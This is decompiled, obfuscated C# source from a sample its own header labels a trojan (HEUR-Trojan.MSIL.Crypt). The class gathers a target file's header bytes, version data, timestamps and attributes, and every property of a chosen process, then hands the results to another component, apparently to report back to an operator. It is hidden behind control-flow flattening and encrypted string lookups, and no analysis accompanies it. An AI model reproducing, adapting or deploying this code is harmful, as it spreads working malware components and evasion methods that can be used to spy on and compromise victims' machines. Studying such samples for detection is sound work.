// Decompiled with JetBrains decompiler
// Type: @ӣ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;

internal sealed class \u0040ӣ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string JSA() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u0038IE() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040ӣ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    int num1 = \u0040ӣ.\u0040ӽ() ? 3 : 2;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 2:
          goto label_4;
        case 1:
        case 3:
          goto label_1;
        case 4:
          goto label_5;
        default:
          num1 = 4;
          continue;
      }
    }
label_1:
    \u0040ӣ.\u0040Ӗ((object) this);
    goto label_5;
label_4:
    \u0040ӣ.\u0040ӕ();
    goto label_1;
label_5:
    try
    {
      Dictionary<string, string> dictionary1 = _param2.\u0040ӗ<Dictionary<string, string>>();
      Dictionary<string, Dictionary<string, string>> dictionary2 = new Dictionary<string, Dictionary<string, string>>()
      {
        {
          (string) \u0040ӣ.\u0040ӗ(970),
          new Dictionary<string, string>()
        },
        {
          (string) \u0040ӣ.\u0040ӗ(1268),
          new Dictionary<string, string>()
        },
        {
          (string) \u0040ӣ.\u0040ӗ(1286),
          new Dictionary<string, string>()
        },
        {
          (string) \u0040ӣ.\u0040ӗ(1312),
          new Dictionary<string, string>()
        }
      };
      DateTime dateTime1;
      if (\u0040ӣ.\u0040Ә((object) dictionary1[(string) \u0040ӣ.\u0040ӗ(908)]))
      {
        dictionary2[(string) \u0040ӣ.\u0040ӗ(970)][(string) \u0040ӣ.\u0040ӗ(1330)] = (string) \u0040ӣ.\u0040ә((object) dictionary1[(string) \u0040ӣ.\u0040ӗ(908)]);
        dictionary2[(string) \u0040ӣ.\u0040ӗ(970)][(string) \u0040ӣ.\u0040ӗ(1356)] = (string) \u0040ӣ.\u0040ӗ(1368);
        try
        {
          byte[] numArray = new byte[2];
          FileStream fileStream = (FileStream) \u0040ӣ.\u0040Ӛ((object) dictionary1[(string) \u0040ӣ.\u0040ӗ(908)], FileMode.Open);
          try
          {
            \u0040ӣ.\u0040ӛ((object) fileStream, (object) numArray, 0, 2);
          }
          finally
          {
            if (fileStream != null)
              \u0040ӣ.\u0040Ӝ((object) fileStream);
          }
          dictionary2[(string) \u0040ӣ.\u0040ӗ(970)][(string) \u0040ӣ.\u0040ӗ(1356)] = \u0040ӣ.\u0040ӟ(\u0040ӣ.\u0040Ӟ(\u0040ӣ.\u0040ӝ(), (object) numArray), \u0040ӣ.\u0040ӗ(1380)) ? (string) \u0040ӣ.\u0040ӗ(1388) : (string) \u0040ӣ.\u0040ӗ(1368);
        }
        catch
        {
          dictionary2[(string) \u0040ӣ.\u0040ӗ(970)][(string) \u0040ӣ.\u0040ӗ(1356)] = \u0040ӣ.\u0040ӟ(\u0040ӣ.\u0040Ӡ((object) dictionary1[(string) \u0040ӣ.\u0040ӗ(908)]), \u0040ӣ.\u0040ӗ(1412)) ? (string) \u0040ӣ.\u0040ӗ(1388) : (string) \u0040ӣ.\u0040ӗ(1368);
        }
        try
        {
          FileVersionInfo fileVersionInfo = (FileVersionInfo) \u0040ӣ.\u0040ӡ((object) dictionary1[(string) \u0040ӣ.\u0040ӗ(908)]);
          if (\u0040ӣ.\u0040Ӣ((object) fileVersionInfo) != null && !\u0040ӣ.\u0040ӣ(\u0040ӣ.\u0040Ӣ((object) fileVersionInfo)))
            dictionary2[(string) \u0040ӣ.\u0040ӗ(970)][(string) \u0040ӣ.\u0040ӗ(1330)] = (string) \u0040ӣ.\u0040Ӣ((object) fileVersionInfo);
          // ISSUE: type reference
          // ISSUE: explicit non-virtual call
          PropertyInfo[] properties = __nonvirtual (\u0040ӣ.\u0040Ӥ(__typeref (FileVersionInfo)).GetProperties());
label_49:
          for (int index = 0; index < properties.Length; ++index)
          {
            try
            {
              PropertyInfo propertyInfo = properties[index];
              int num2 = 8;
              while (true)
              {
                DateTime dateTime2;
                object obj;
                string str;
                int num3;
                int num4;
                switch (num2)
                {
                  case 0:
                  case 10:
                    dictionary2[(string) \u0040ӣ.\u0040ӗ(1268)][(string) \u0040ӣ.\u0040ө((object) propertyInfo)] = str;
                    num2 = 16;
                    continue;
                  case 1:
                    if (!\u0040ӣ.\u0040Ө((object) (string) obj))
                    {
                      num2 = 9;
                      continue;
                    }
                    break;
                  case 2:
                  case 6:
                    // ISSUE: type reference
                    if (!\u0040ӣ.\u0040ӧ(\u0040ӣ.\u0040Ӧ((object) propertyInfo), \u0040ӣ.\u0040Ӥ(__typeref (string))))
                    {
                      num2 = 1;
                      continue;
                    }
                    goto case 9;
                  case 3:
                    str = dateTime1.ToString((IFormatProvider) \u0040ӣ.\u0040ӫ());
                    if (true)
                    {
                      num2 = 0;
                      continue;
                    }
                    goto case 8;
                  case 4:
                    num3 = (bool) obj ? 1 : 0;
                    goto label_26;
                  case 5:
                    num4 = 1;
                    goto label_40;
                  case 8:
                    obj = \u0040ӣ.\u0040ӥ((object) propertyInfo, (object) fileVersionInfo, (object) null);
                    num2 = 12;
                    continue;
                  case 9:
                    if (!\u0040ӣ.\u0040Ӫ(\u0040ӣ.\u0040ө((object) propertyInfo), \u0040ӣ.\u0040ӗ(1424)))
                    {
                      if (true)
                      {
                        num2 = 14;
                        continue;
                      }
                      goto case 3;
                    }
                    else
                      break;
                  case 12:
                    if (obj != null)
                    {
                      \u0040ӣ.\u0040ӽ();
                      num2 = !\u0040ӣ.\u0040Ӽ() ? 11 : 6;
                      continue;
                    }
                    break;
                  case 13:
                    dateTime1 = dateTime2.ToUniversalTime();
                    num2 = 3;
                    continue;
                  case 14:
                    // ISSUE: type reference
                    if (\u0040ӣ.\u0040ӧ(\u0040ӣ.\u0040Ӧ((object) propertyInfo), \u0040ӣ.\u0040Ӥ(__typeref (bool))))
                    {
                      num3 = 1;
                      goto label_26;
                    }
                    else
                    {
                      num2 = 4;
                      continue;
                    }
                  case 15:
                    dateTime2 = (DateTime) obj;
                    if (true)
                    {
                      num2 = 5;
                      continue;
                    }
                    goto case 0;
                  case 16:
                    goto label_49;
                  default:
label_30:
                    if (obj is DateTime)
                    {
                      num2 = 15;
                      continue;
                    }
                    num4 = 0;
                    goto label_40;
                }
                num3 = 0;
label_26:
                if (num3 == 0)
                  goto label_49;
                else
                  goto label_30;
label_40:
                if (num4 != 0)
                {
                  int num5 = 13;
                  num2 = \u0040ӣ.\u0040ӽ() ? num5 : num5;
                }
                else
                {
                  str = obj.ToString();
                  num2 = 10;
                }
              }
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        try
        {
          FileInfo fileInfo = new FileInfo(dictionary1[(string) \u0040ӣ.\u0040ӗ(908)]);
          int num6 = 6;
          while (true)
          {
            switch (num6)
            {
              case 0:
                Dictionary<string, string> dictionary3 = dictionary2[(string) \u0040ӣ.\u0040ӗ(970)];
                object key1 = \u0040ӣ.\u0040ӗ(1086);
                dateTime1 = \u0040ӣ.\u0040Ӯ((object) fileInfo);
                dateTime1 = dateTime1.ToUniversalTime();
                string str1 = dateTime1.ToString((IFormatProvider) \u0040ӣ.\u0040ӫ());
                dictionary3[(string) key1] = str1;
                goto default;
              case 1:
              case 4:
                Dictionary<string, string> dictionary4 = dictionary2[(string) \u0040ӣ.\u0040ӗ(970)];
                object key2 = \u0040ӣ.\u0040ӗ(1124);
                dateTime1 = \u0040ӣ.\u0040Ӱ((object) fileInfo);
                dateTime1 = dateTime1.ToUniversalTime();
                string str2 = dateTime1.ToString((IFormatProvider) \u0040ӣ.\u0040ӫ());
                dictionary4[(string) key2] = str2;
                num6 = 7;
                continue;
              case 2:
              case 3:
                Dictionary<string, string> dictionary5 = dictionary2[(string) \u0040ӣ.\u0040ӗ(970)];
                object key3 = \u0040ӣ.\u0040ӗ(1104);
                dateTime1 = \u0040ӣ.\u0040ӯ((object) fileInfo);
                dateTime1 = dateTime1.ToUniversalTime();
                string str3 = dateTime1.ToString((IFormatProvider) \u0040ӣ.\u0040ӫ());
                dictionary5[(string) key3] = str3;
                goto case 1;
              case 5:
                dictionary2[(string) \u0040ӣ.\u0040ӗ(970)][(string) \u0040ӣ.\u0040ӗ(1006)] = (string) \u0040ӣ.\u0040ӭ((object) fileInfo);
                num6 = 0;
                continue;
              case 6:
                dictionary2[(string) \u0040ӣ.\u0040ӗ(970)][(string) \u0040ӣ.\u0040ӗ(988)] = \u0040ԝ.\u0040ܯ(\u0040ӣ.\u0040Ӭ((object) fileInfo));
                num6 = 5;
                continue;
              case 7:
                goto label_62;
              default:
                if (!\u0040ӣ.\u0040ӽ())
                {
                  if (true)
                  {
                    num6 = 2;
                    continue;
                  }
                  goto case 2;
                }
                else
                {
                  if (\u0040ӣ.\u0040Ӽ())
                  {
                    num6 = 1;
                    continue;
                  }
                  goto case 6;
                }
            }
          }
label_62:
          dictionary2[(string) \u0040ӣ.\u0040ӗ(970)][(string) \u0040ӣ.\u0040ӗ(1144)] = \u0040ӣ.\u0040ӱ((object) fileInfo).HasFlag((Enum) FileAttributes.ReadOnly) ? (string) \u0040ӣ.\u0040ӗ(1170) : (string) \u0040ӣ.\u0040ӗ(1164);
          dictionary2[(string) \u0040ӣ.\u0040ӗ(970)][(string) \u0040ӣ.\u0040ӗ(1176)] = \u0040ӣ.\u0040ӱ((object) fileInfo).HasFlag((Enum) FileAttributes.Hidden) ? (string) \u0040ӣ.\u0040ӗ(1170) : (string) \u0040ӣ.\u0040ӗ(1164);
          dictionary2[(string) \u0040ӣ.\u0040ӗ(970)][(string) \u0040ӣ.\u0040ӗ(1192)] = \u0040ӣ.\u0040ӱ((object) fileInfo).HasFlag((Enum) FileAttributes.System) ? (string) \u0040ӣ.\u0040ӗ(1170) : (string) \u0040ӣ.\u0040ӗ(1164);
          dictionary2[(string) \u0040ӣ.\u0040ӗ(970)][(string) \u0040ӣ.\u0040ӗ(1208)] = \u0040ӣ.\u0040ӱ((object) fileInfo).HasFlag((Enum) FileAttributes.Archive) ? (string) \u0040ӣ.\u0040ӗ(1170) : (string) \u0040ӣ.\u0040ӗ(1164);
        }
        catch
        {
        }
        try
        {
          dictionary2[(string) \u0040ӣ.\u0040ӗ(1286)][(string) \u0040ӣ.\u0040ӗ(1436)] = (string) \u0040ӣ.\u0040ӗ(1460);
          int num7 = 1;
          bool flag;
          AssemblyName assemblyName;
          while (true)
          {
            switch (num7)
            {
              case 0:
              case 5:
                dictionary2[(string) \u0040ӣ.\u0040ӗ(1286)][(string) \u0040ӣ.\u0040ӗ(1498)] = \u0040ӣ.\u0040Ӵ((object) assemblyName).ToString();
                num7 = 8;
                continue;
              case 1:
                flag = \u0040ӣ.\u0040ӟ((object) dictionary2[(string) \u0040ӣ.\u0040ӗ(970)][(string) \u0040ӣ.\u0040ӗ(1356)], \u0040ӣ.\u0040ӗ(1388));
                num7 = 4;
                continue;
              case 2:
              case 3:
                dictionary2[(string) \u0040ӣ.\u0040ӗ(1286)][(string) \u0040ӣ.\u0040ӗ(1436)] = (string) \u0040ӣ.\u0040ӗ(1474);
                num7 = 6;
                continue;
              case 4:
                if (flag)
                {
                  if (\u0040ӣ.\u0040Ӽ())
                  {
                    num7 = 7;
                    continue;
                  }
                  goto case 7;
                }
                else
                  goto label_78;
              case 6:
                dictionary2[(string) \u0040ӣ.\u0040ӗ(1286)][(string) \u0040ӣ.\u0040ӗ(1486)] = (string) \u0040ӣ.\u0040ӳ((object) assemblyName);
                goto case 0;
              case 7:
                assemblyName = (AssemblyName) \u0040ӣ.\u0040Ӳ((object) dictionary1[(string) \u0040ӣ.\u0040ӗ(908)]);
                goto default;
              case 8:
                goto label_78;
              default:
                \u0040ӣ.\u0040ӽ();
                if (\u0040ӣ.\u0040Ӽ())
                {
                  if (true)
                  {
                    num7 = 2;
                    continue;
                  }
                  goto case 6;
                }
                else
                {
                  num7 = 0;
                  continue;
                }
            }
          }
        }
        catch
        {
        }
label_78:;
      }
      if (!\u0040ӣ.\u0040ӣ((object) dictionary1[(string) \u0040ӣ.\u0040ӗ(1516)]))
      {
        try
        {
          Process process = (Process) \u0040ӣ.\u0040Ӷ(\u0040ӣ.\u0040ӵ((object) dictionary1[(string) \u0040ӣ.\u0040ӗ(1516)]));
          // ISSUE: type reference
          // ISSUE: explicit non-virtual call
          PropertyInfo[] properties = __nonvirtual (\u0040ӣ.\u0040Ӥ(__typeref (Process)).GetProperties());
label_120:
          for (int index = 0; index < properties.Length; ++index)
          {
            try
            {
              PropertyInfo propertyInfo = properties[index];
              int num8 = 13;
              if (true)
                goto label_86;
label_82:
              ICollection collection;
              int num9 = \u0040ӣ.\u0040Ӹ((object) collection);
              num8 = 0;
label_86:
              while (true)
              {
                object obj;
                DateTime dateTime3;
                bool flag;
                string str;
                int num10;
                int num11;
                switch (num8)
                {
                  case 0:
                    str = num9.ToString();
                    if (\u0040ӣ.\u0040Ӽ())
                    {
                      num8 = 20;
                      continue;
                    }
                    goto case 8;
                  case 1:
                    if (!flag)
                    {
                      str = obj.ToString();
                      num8 = 15;
                      continue;
                    }
                    goto label_82;
                  case 2:
                    if (\u0040ӣ.\u0040ӷ(\u0040ӣ.\u0040ө((object) propertyInfo), \u0040ӣ.\u0040ӗ(1526)))
                    {
                      num8 = 14;
                      continue;
                    }
                    break;
                  case 3:
                  case 17:
                    if (!\u0040ӣ.\u0040Ө((object) (string) obj))
                    {
                      num8 = 2;
                      continue;
                    }
                    break;
                  case 4:
                    // ISSUE: type reference
                    if (!\u0040ӣ.\u0040ӧ(\u0040ӣ.\u0040Ӧ((object) propertyInfo), \u0040ӣ.\u0040Ӥ(__typeref (string))))
                    {
                      \u0040ӣ.\u0040ӽ();
                      num8 = !\u0040ӣ.\u0040Ӽ() ? 12 : 17;
                      continue;
                    }
                    goto case 2;
                  case 5:
                    dateTime3 = (DateTime) obj;
                    goto case 6;
                  case 6:
                    num10 = 1;
                    goto label_116;
                  case 7:
                  case 15:
                  case 20:
                    dictionary2[(string) \u0040ӣ.\u0040ӗ(1312)][(string) \u0040ӣ.\u0040ө((object) propertyInfo)] = str;
                    num8 = 22;
                    continue;
                  case 8:
                    if (obj is DateTime)
                    {
                      num8 = 5;
                      continue;
                    }
                    num10 = 0;
                    goto label_116;
                  case 9:
                    // ISSUE: type reference
                    if (\u0040ӣ.\u0040ӧ(\u0040ӣ.\u0040Ӧ((object) propertyInfo), \u0040ӣ.\u0040Ӥ(__typeref (bool))))
                    {
                      num11 = 1;
                      goto label_91;
                    }
                    else
                    {
                      int num12 = 10;
                      num8 = \u0040ӣ.\u0040ӽ() ? num12 : num12;
                      continue;
                    }
                  case 10:
                    num11 = (bool) obj ? 1 : 0;
                    goto label_91;
                  case 11:
                    if (obj != null)
                    {
                      num8 = 4;
                      continue;
                    }
                    break;
                  case 12:
                  case 16:
                    goto label_82;
                  case 13:
                    obj = \u0040ӣ.\u0040ӥ((object) propertyInfo, (object) process, (object) null);
                    if (true)
                    {
                      num8 = 11;
                      continue;
                    }
                    goto case 0;
                  case 14:
                    if (\u0040ӣ.\u0040ӷ(\u0040ӣ.\u0040ө((object) propertyInfo), \u0040ӣ.\u0040ӗ(1550)))
                    {
                      if (true)
                      {
                        num8 = 9;
                        continue;
                      }
                      goto case 5;
                    }
                    else
                      break;
                  case 18:
                    dateTime1 = dateTime3.ToUniversalTime();
                    num8 = 21;
                    continue;
                  case 19:
                    flag = collection != null;
                    num8 = 1;
                    continue;
                  case 21:
                    str = dateTime1.ToString((IFormatProvider) \u0040ӣ.\u0040ӫ());
                    num8 = 7;
                    continue;
                  case 22:
                    goto label_120;
                  default:
                    num8 = 6;
                    continue;
                }
                num11 = 0;
label_91:
                if (num11 != 0)
                {
                  num8 = 8;
                  continue;
                }
                goto label_120;
label_116:
                if (num10 == 0)
                {
                  collection = obj as ICollection;
                  num8 = 19;
                }
                else
                  num8 = 18;
              }
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
      }
      \u0040ӣ.\u0040Ӻ((object) _param1, \u0040ӣ.\u0040ӗ(1572), \u0040ӣ.\u0040ӹ((object) dictionary2), _param3);
      this.\u0040Ӕ = 0;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040ӣ.\u0040ӻ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӗ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ә(object _param0) => File.Exists((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ә(object _param0) => (object) Path.GetFileName((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӛ(object _param0, FileMode _param1) => (object) File.Open((string) _param0, _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040ӛ(object _param0, object _param1, int _param2, int _param3) => ((Stream) _param0).Read((byte[]) _param1, _param2, _param3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӝ(object _param0) => ((IDisposable) _param0).Dispose();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӝ() => (object) Encoding.UTF8;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӟ(object _param0, object _param1) => (object) ((Encoding) _param0).GetString((byte[]) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӟ(object _param0, object _param1) => (string) _param0 == (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӡ(object _param0) => (object) Path.GetExtension((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӡ(object _param0) => (object) FileVersionInfo.GetVersionInfo((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӣ(object _param0) => (object) ((FileVersionInfo) _param0).FileDescription;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӣ(object _param0) => string.IsNullOrWhiteSpace((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static Type \u0040Ӥ(RuntimeTypeHandle _param0) => Type.GetTypeFromHandle(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӥ(object _param0, object _param1, object _param2) => ((PropertyInfo) _param0).GetValue(_param1, (object[]) _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static Type \u0040Ӧ(object _param0) => ((PropertyInfo) _param0).PropertyType;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӧ(Type _param0, Type _param1) => _param0 != _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ө(object _param0) => string.IsNullOrEmpty((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ө(object _param0) => (object) ((MemberInfo) _param0).Name;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӫ(object _param0, object _param1) => ((string) _param0).EndsWith((string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӫ() => (object) CultureInfo.InvariantCulture;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static long \u0040Ӭ(object _param0) => ((FileInfo) _param0).Length;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӭ(object _param0) => (object) ((FileSystemInfo) _param0).FullName;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static DateTime \u0040Ӯ(object _param0) => ((FileSystemInfo) _param0).CreationTime;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static DateTime \u0040ӯ(object _param0) => ((FileSystemInfo) _param0).LastWriteTime;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static DateTime \u0040Ӱ(object _param0) => ((FileSystemInfo) _param0).LastAccessTime;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static FileAttributes \u0040ӱ(object _param0) => ((FileSystemInfo) _param0).Attributes;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӳ(object _param0) => (object) AssemblyName.GetAssemblyName((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӳ(object _param0) => (object) ((AssemblyName) _param0).FullName;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӵ(object _param0) => (object) ((AssemblyName) _param0).Version;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040ӵ(object _param0) => Convert.ToInt32((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӷ(int _param0) => (object) Process.GetProcessById(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӷ(object _param0, object _param1) => (string) _param0 != (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040Ӹ(object _param0) => ((ICollection) _param0).Count;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӹ(object _param0) => (object) _param0.\u0040ӓ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӻ(object _param0, object _param1, object _param2, \u0040Ԫ _param3) => \u0040Ԡ.\u0040Ӕ.\u0040Ӗ(_param0, _param1, _param2, _param3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӻ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӽ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӽ() => false;
}
